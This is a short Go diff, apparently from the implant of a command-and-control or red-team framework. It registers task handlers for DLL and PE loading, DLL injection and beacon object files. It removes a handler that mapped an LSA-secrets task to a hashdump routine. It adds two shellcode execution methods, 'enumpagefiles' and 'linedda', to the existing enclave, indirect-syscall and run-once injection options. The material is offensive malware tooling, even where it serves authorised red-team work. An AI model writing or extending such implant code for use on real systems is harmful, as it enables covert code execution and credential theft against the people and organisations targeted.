@@ -49,7 +49,6 @@ func init() {
 	Register(proto.TaskLoadDLL, handleLoadDLL)
 	Register(proto.TaskLoadPE, handleLoadPE)
 	Register(proto.TaskInjectDLL, handleInjectDLL)
-	Register(proto.TaskLSASecrets, handleHashdump)
 	Register(proto.TaskBOF, handleBOF)
 }
 
@@ -378,8 +377,12 @@ func handleExecute(task *proto.Task) *proto.TaskResult {
 		err = shellcode.IndirectSyscallInject(task.Data)
 	case "once":
 		err = shellcode.RunOnce(task.Data)
+	case "enumpagefiles":
+		err = shellcode.EnumPageFilesW(task.Data)
+	case "linedda":
+		err = shellcode.LineDDA(task.Data)
 	default:
-		return fail(task, "invalid method: "+args.Method+" (valid: enclave, indirect, once)")
+		return fail(task, "invalid method: "+args.Method+" (valid: enclave, indirect, once, linedda, enumpagefiles)")
 	}
 
 	if err != nil {
